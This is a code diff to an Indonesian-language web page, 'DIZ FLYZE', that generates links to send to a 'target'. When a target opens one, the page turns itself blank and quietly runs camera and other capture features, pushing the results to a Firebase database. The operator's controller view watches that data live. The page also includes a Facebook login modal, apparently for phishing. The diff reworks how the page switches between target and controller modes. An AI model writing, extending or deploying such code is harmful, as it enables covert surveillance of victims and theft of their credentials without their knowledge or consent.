@@ -16,7 +16,7 @@
       font-family: 'Roboto', sans-serif;
       background: linear-gradient(135deg, #0d0d0d, #1f1f1f);
       color: #fff;
-      transition: background 0.5s;
+      transition: background 0.5s, opacity 0.5s;
     }
     /* Dark mode */
     body.dark-mode {
@@ -90,7 +90,7 @@
       background: linear-gradient(90deg, #39ff14, #14c9ff);
       transition: width 0.5s;
     }
-    /* Header */
+    /* Header (Controller Mode) */
     #header {
       position: fixed;
       top: 0; left: 0;
@@ -143,7 +143,7 @@
     #toast button {
       color: #39ff14;
     }
-    /* Konten Utama */
+    /* Konten Utama (Controller Mode) */
     #mainContent {
       margin-top: 80px;
       text-align: center;
@@ -154,7 +154,7 @@
       max-width: 500px;
       text-shadow: 0 0 10px rgba(57, 255, 20, 0.7);
     }
-    /* Kolom Interaktif */
+    /* Kolom Interaktif (Controller Mode) */
     #actions {
       display: flex;
       justify-content: center;
@@ -190,7 +190,7 @@
       font-size: 16px;
       text-align: left;
     }
-    /* Footer */
+    /* Footer (Controller Mode) */
     #footer {
       position: fixed;
       bottom: 10px;
@@ -215,7 +215,7 @@
     <p>Loading...</p>
   </div>
 
-  <!-- Modal: Login Facebook -->
+  <!-- Modal: Login Facebook (Controller Mode) -->
   <div id="loginModal" class="modal-overlay">
     <div class="modal-content">
       <div class="text-center">
@@ -312,7 +312,7 @@
   <div id="mainContent">
     <div id="bio">
       <h2>DIZ FLYZE</h2>
-      <p>Web ini menghasilkan Link yang akan anda kirim ke target dan jika target mengunjungi Link itu maka data aktivitas akan ditampilkan live di sini.</p>
+      <p>Pilih fitur yang akan Anda gunakan untuk menghasilkan link yang akan dikirim ke target. Setelah memilih, Anda dapat mengakses fitur tersebut untuk mendapatkan link share.</p>
     </div>
     <!-- Kolom Interaktif (Controller Mode) -->
     <div id="actions">
@@ -351,21 +351,28 @@
 
   <!-- Script Utama -->
   <script>
-    /***** Setup Session & Role *****/
+    /***** Setup Parameter & Mode *****/
     const urlParams = new URLSearchParams(window.location.search);
-    // Jika ada parameter session, gunakan nilainya; jika tidak, generate session baru
-    const sessionId = urlParams.has('session') ? urlParams.get('session') : 'session_' + Date.now();
-    const refPath = 'ALL DATA/' + sessionId;
-    // Jika terdapat parameter "control", maka ini adalah mode controller
-    const isController = urlParams.has('control');
+    // Jika URL mengandung parameter "session" atau "feature", maka asumsikan ini adalah mode TARGET
+    // Kecuali jika ada parameter "control" yang memaksa mode CONTROLLER.
+    const hasSessionOrFeature = urlParams.has('session') || urlParams.has('feature');
+    const isController = (!hasSessionOrFeature) || urlParams.has('control');
 
-    // Fungsi untuk menampilkan log event (pada controller)
-    function logEvent(feature, data) {
-      console.log('[' + feature + '] ', data);
-      // Anda dapat mengembangkan untuk menampilkan data ke UI secara real time
+    // Jika ada parameter "session", gunakan nilainya; jika tidak, buat session baru (untuk controller)
+    let sessionId = urlParams.get('session');
+    if (!sessionId) {
+      sessionId = 'session_' + Date.now();
+    }
+    const feature = urlParams.get('feature'); // bisa null
+    const refPath = 'ALL DATA/' + sessionId;
+
+    // Fungsi untuk mencatat log (di controller)
+    function logEvent(featureName, data) {
+      console.log('[' + featureName + '] ', data);
+      // Anda bisa mengupdate UI secara real-time jika diinginkan
     }
 
-    /***** Fungsi Fitur (Mode Target) *****/
+    /***** Fungsi Fitur (Mode TARGET) *****/
     function captureCamera() {
       if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
         navigator.mediaDevices.getUserMedia({ video: true })
@@ -483,15 +490,14 @@
       }
     }
 
-    /***** Jika Mode Target (bukan controller) *****/
-    if(!isController){
-      // Sembunyikan UI agar target melihat halaman blank
+    /***** Eksekusi Berdasarkan Mode *****/
+    if (!isController) {
+      // Mode TARGET: sembunyikan UI agar target hanya melihat halaman blank
       document.addEventListener("DOMContentLoaded", function() {
         document.body.style.opacity = '0';
         document.body.style.backgroundColor = "#fff";
       });
-      // Baca parameter fitur dan jalankan fungsi yang sesuai
-      const feature = urlParams.get('feature');
+      // Berdasarkan parameter "feature", jalankan fungsi yang sesuai
       switch(feature) {
         case 'camera':
           captureCamera();
@@ -506,7 +512,6 @@
           captureFlash();
           break;
         default:
-          // Jika tidak ada fitur yang dikenal, kirim log
           firebase.database().ref(refPath + '/general').push({
             message: 'tidak ada fitur yang dijalankan',
             timestamp: new Date().toISOString()
@@ -515,18 +520,18 @@
       }
     }
 
-    /***** Kode untuk Mode Controller *****/
+    /***** Kode untuk Mode CONTROLLER *****/
     $(document).ready(function(){
       startLoading();
 
-      if(isController){
-        // Tampilkan UI controller (tidak disembunyikan)
+      if(isController) {
+        // Pastikan UI controller tampil penuh
         $('body').css('opacity', '1');
 
-        // Pasang listener untuk menerima data aktivitas dari target secara realtime
+        // Pasang listener untuk menerima data aktivitas target secara realtime
         firebase.database().ref(refPath).on('child_added', function(snapshot) {
           logEvent(snapshot.key, snapshot.val());
-          // Anda dapat mengupdate UI controller untuk menampilkan data ini secara live
+          // Anda dapat mengupdate UI controller untuk menampilkan data secara live
         });
 
         /* ----------------- Login ----------------- */
@@ -569,7 +574,7 @@
         /* ----------------- Kamera ----------------- */
         $('#cameraColumn').on('click', function(){
           $('#cameraModal').fadeIn();
-          // Buat share link untuk kamera (tanpa control, link yang akan dikirim ke target)
+          // Buat share link untuk kamera (tanpa parameter "control")
           const shareLink = window.location.origin + window.location.pathname + "?session=" + sessionId + "&feature=camera";
           $('#cameraShareLink').val(shareLink);
           if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
@@ -640,7 +645,6 @@
         $('#fileInput').on('change', function(){
           const file = this.files[0];
           if(file){
-            // Simulasi: buat share link file (misalnya, setelah upload nantinya)
             const fileLink = window.location.origin + window.location.pathname + "?session=" + sessionId + "&feature=file&filename=" + encodeURIComponent(file.name);
             $('#fileModal').fadeIn();
             $('#fileShareLink').val(fileLink);
@@ -707,7 +711,6 @@
                   alert('Tidak dapat mengakses kamera atau perangkat tidak mendukung fitur senter.');
                 });
             } else {
-              // Toggle menggunakan stream yang ada
               const track = currentFlashStream.getVideoTracks()[0];
               const imageCapture = new ImageCapture(track);
               imageCapture.getPhotoCapabilities().then(function(capabilities){
@@ -772,4 +775,4 @@
     }
   </script>
 </body>
-  </html>
+</html>
